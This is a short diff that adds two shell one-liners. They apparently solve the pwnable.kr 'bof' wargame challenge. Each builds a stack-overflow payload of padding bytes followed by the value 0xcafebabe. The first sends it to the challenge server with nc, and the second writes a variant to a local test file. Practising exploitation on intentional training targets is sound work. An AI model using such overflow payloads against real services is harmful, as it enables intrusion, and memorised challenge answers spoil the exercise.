@@ -1,0 +1,3 @@
+echo "$(python -c 'print("A"*32 + "\xbe\xba\xfe\xca")')" | nc pwnable.kr 9000
+
+echo "$(python -c 'print("A"*44 + "\xbe\xba\xfe\xca")')" > test
